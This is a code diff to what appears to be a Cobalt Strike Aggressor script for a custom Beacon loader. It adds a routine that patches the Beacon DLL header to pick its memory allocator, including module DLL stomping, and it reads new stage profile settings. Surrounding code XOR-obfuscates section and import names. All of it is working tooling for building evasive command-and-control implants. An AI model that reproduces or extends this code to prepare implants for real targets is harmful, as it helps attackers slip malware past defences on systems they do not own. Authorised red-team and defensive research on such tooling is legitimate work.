@@ -442,6 +442,48 @@ sub boku_strrep {
 	return $beacon_dll;
 }
 
+# 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
+sub setupAllocatorMethod {
+	local('$beacon_dll $allocator $module_x64 $allocator_code $allocator_code_offset');
+	local('@Bytes $Byte $index $x');
+	$beacon_dll = $1;
+	$allocator  = $2;
+	$module_x64 = $3;
+	$allocator_code = 0;
+	$allocator_code_offset = 64;
+	
+	# If the module_x64 string is set to a DLL, then use this allocator 
+	if ($module_x64 ne "") {
+		println("[+] Allocator method set to: Module DLL Stomp");
+		println("[+] Writing DLL UTF8 name string $module_x64 to beacon header at +0x44");
+		# 68 = 0x44 ; write string here same as Cobalt Strike does
+		$beacon_dll = pe_set_stringz($beacon_dll, 68, $module_x64);
+		# Check that the string was written
+		$modstrchk    = getStringFromOffset($beacon_dll, 68);
+		println("|_ Outputting string from beacon.dll+0x44: ".$modstrchk);
+		$allocator_code = 4;
+	# HeapAlloc, MapViewOfFile, and VirtualAlloc
+	}else if ($allocator eq "HeapAlloc") {
+		println("[+] Allocator  set to: ".$allocator);
+		$allocator_code = 3;
+	}else if ($allocator eq "MapViewOfFile") {
+		$allocator_code = 2;
+	}else {
+		$allocator_code = 1;
+	}
+	println("|_ Allocator code set to: ".$allocator_code);
+	println("|_ Writing allocator code at beacon.dll+0x40");
+	$beacon_dll = pe_set_short($beacon_dll, $allocator_code_offset, $allocator_code);
+	for ($x = 0; $x < 2; $x++) {
+		$index = $allocator_code_offset;
+		$index += $x;
+		$Byte = byteAt($beacon_dll, $index);
+		@Bytes[$x] = uc(formatNumber($Byte, 16));
+	}
+	println("|_ Allocator code at offset +0x40: ".@Bytes);
+	return $beacon_dll;
+}
+
 sub generate_my_dll {
 
 	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
@@ -458,6 +500,8 @@ sub generate_my_dll {
 	$allocator  = [$profile getString: ".stage.allocator"];
 	$magic_mz   = [$profile getString: ".stage.magic_mz_x64"];
 	$smartinject = [$profile getString: ".stage.smartinject"];
+	$image_size_x64 = [$profile getString: ".stage.image_size_x64"];
+	$module_x64 = [$profile getString: ".stage.module_x64"];
 
 	#@strings = [$profile getList: ".stage.string"];
 	#println(@strings);
@@ -494,7 +538,10 @@ sub generate_my_dll {
 	println("|__ prepend: ".$prepend);
 	println("|__ allocator: ".$allocator);
 	println("|__ magic_mz: ".$magic_mz);
+	println("|__ image_size_x64: ".$image_size_x64);
+	println("|__ module_x64: ".$module_x64);
 	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
+	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
 	if ($obfuscate eq "true") {
 		$xorKey = 0xC3;
 		println("[+] Obfuscating section names, DLL import names, and DLL import entry names with XOR key: ".uc(formatNumber($xorKey, 16)));
@@ -508,7 +555,7 @@ sub generate_my_dll {
 #	$temp_dll = setEgg($temp_dll);
 #	$temp_dll = boku_pe_mask($temp_dll); # Currrently causes issue if prepend transform is in C2 profile. Causes wrong bytes to be overwritten due to offset change
 	$temp_dll = boku_strrep($temp_dll);
-	$temp_dll = prependBytes($temp_dll);
+#	$temp_dll = prependBytes($temp_dll);
 
 	return $temp_dll;
 }
